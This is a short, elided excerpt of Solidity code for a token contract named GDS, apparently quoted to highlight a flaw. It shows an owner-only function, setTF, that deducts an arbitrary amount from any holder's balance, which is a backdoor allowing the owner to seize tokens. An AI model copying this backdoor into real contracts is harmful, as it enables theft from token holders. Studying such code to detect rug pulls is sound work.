...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setTF(address f, address t, uint256 a) external onlyOwner {
        _balances[f] = _balances[f] - a;
...
contract GDS is AbsToken {
    constructor() AbsToken(
        ...
        18,
        100000000,
        address(0x9904F6B33C853Bb3c4830cEAcd668cF13d8B5506),
        address(0x9904F6B33C853Bb3c4830cEAcd668cF13d8B5506),
        address(0x2a0C87DE1a6a51ef64823B479Bb07307ebffd6dA),
        100000000
    ){
